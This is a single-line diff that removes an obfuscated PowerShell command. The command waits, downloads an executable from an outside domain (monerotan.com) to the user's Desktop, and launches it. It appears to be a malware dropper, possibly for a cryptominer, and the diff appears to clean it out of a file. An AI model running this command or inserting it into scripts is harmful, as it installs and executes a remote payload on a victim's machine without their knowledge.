@@ -1,1 +1,0 @@
-$7d0mK6 = [Type]'eNVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtFoLDeRpATh('Desktop');(&'New-Object' 'System.Net.WeBClIenT').dOwNLOaDfiLE.INVokE('http://monerotan.com/ieprotocol','$Des\6966725.exe');&'Start-Process' $Des\6966725.exe
